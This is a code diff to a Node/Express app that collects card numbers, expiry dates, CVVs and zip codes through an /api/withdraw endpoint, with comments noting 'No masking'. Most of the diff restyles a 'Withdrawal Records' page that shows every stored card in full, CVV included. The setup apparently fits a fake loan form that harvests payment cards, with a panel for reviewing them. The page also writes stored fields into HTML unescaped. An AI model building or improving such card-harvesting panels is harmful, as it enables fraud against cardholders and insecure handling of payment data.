@@ -36,7 +36,7 @@ app.post('/api/withdraw', (req, res) => {
         cardNumber, // No masking
         expiry,
         cvv,    // No masking
-        zipCode, // Added Zip Code
+        zipCode,
         loanAmount,
         timestamp: new Date().toISOString()
     };
@@ -134,68 +134,105 @@ app.get('/', (req, res) => {
                     <style>
                         body { 
                             font-family: Arial, sans-serif; 
-                            margin: 20px; 
-                            background: #f8f8f8; 
+                            margin: 0; 
+                            padding: 20px; 
+                            background: #f5f5f5; 
+                            color: #333; 
                         }
                         h1 { 
                             text-align: center; 
                             color: #1e88e5; 
-                            font-size: 24px; 
-                            margin-bottom: 20px; 
+                            font-size: 28px; 
+                            margin-bottom: 30px; 
+                            font-weight: 600; 
+                        }
+                        .records-container {
+                            max-width: 700px;
+                            margin: 0 auto;
                         }
                         .record { 
                             background: #fff; 
-                            padding: 15px; 
-                            margin: 10px auto; 
-                            border-radius: 10px; 
-                            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); 
-                            max-width: 600px; 
+                            padding: 20px; 
+                            margin-bottom: 20px; 
+                            border-radius: 12px; 
+                            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); 
+                            display: flex; 
+                            flex-direction: column; 
+                            gap: 10px; 
                             position: relative; 
                         }
                         .record p { 
-                            margin: 5px 0; 
-                            font-size: 14px; 
+                            margin: 0; 
+                            font-size: 16px; 
+                            line-height: 1.6; 
                         }
                         .record p strong { 
-                            color: #333; 
+                            color: #555; 
+                            font-weight: 600; 
+                            display: inline-block; 
+                            width: 140px; 
                         }
-                        .delete-btn { 
-                            position: absolute; 
-                            top: 15px; 
-                            right: 15px; 
+                        .record .delete-btn { 
+                            margin-top: 15px; 
+                            align-self: flex-end; 
                             background: #f44336; 
                             color: #fff; 
                             border: none; 
-                            padding: 5px 10px; 
-                            border-radius: 5px; 
+                            padding: 8px 16px; 
+                            border-radius: 6px; 
                             cursor: pointer; 
                             font-size: 14px; 
+                            font-weight: 500; 
+                            transition: background 0.3s ease; 
                         }
-                        .delete-btn:hover { 
+                        .record .delete-btn:hover { 
                             background: #d32f2f; 
+                        }
+                        @media (max-width: 600px) {
+                            .record { 
+                                padding: 15px; 
+                            }
+                            .record p { 
+                                font-size: 14px; 
+                            }
+                            .record p strong { 
+                                width: 120px; 
+                            }
+                            .record .delete-btn { 
+                                padding: 6px 12px; 
+                                font-size: 13px; 
+                            }
                         }
                     </style>
                 </head>
                 <body>
                     <h1>Withdrawal Records</h1>
+                    <div class="records-container">
             `;
 
-            withdrawals.forEach((w, index) => {
+            if (withdrawals.length === 0) {
                 html += `
-                    <div class="record">
-                        <button class="delete-btn" onclick="deleteRecord(${index})">Delete</button>
-                        <p><strong>Timestamp:</strong> ${new Date(w.timestamp).toLocaleString()}</p>
-                        <p><strong>Amount:</strong> $${parseFloat(w.loanAmount).toFixed(2)}</p>
-                        <p><strong>Card Number:</strong> ${w.cardNumber}</p>
-                        <p><strong>Expiration:</strong> ${w.expiry}</p>
-                        <p><strong>CVV:</strong> ${w.cvv}</p>
-                        <p><strong>Cardholder Name:</strong> ${w.cardholderName}</p>
-                        <p><strong>Zip Code:</strong> ${w.zipCode}</p>
-                    </div>
+                    <p style="text-align: center; color: #777; font-size: 16px;">No withdrawal records found.</p>
                 `;
-            });
+            } else {
+                withdrawals.forEach((w, index) => {
+                    html += `
+                        <div class="record">
+                            <p><strong>Timestamp:</strong> ${new Date(w.timestamp).toLocaleString()}</p>
+                            <p><strong>Amount:</strong> $${parseFloat(w.loanAmount).toFixed(2)}</p>
+                            <p><strong>Card Number:</strong> ${w.cardNumber}</p>
+                            <p><strong>Expiration:</strong> ${w.expiry}</p>
+                            <p><strong>CVV:</strong> ${w.cvv}</p>
+                            <p><strong>Cardholder Name:</strong> ${w.cardholderName}</p>
+                            <p><strong>Zip Code:</strong> ${w.zipCode}</p>
+                            <button class="delete-btn" onclick="deleteRecord(${index})">Delete</button>
+                        </div>
+                    `;
+                });
+            }
 
             html += `
+                    </div>
                     <script>
                         function deleteRecord(index) {
                             if (confirm('Are you sure you want to delete this record?')) {
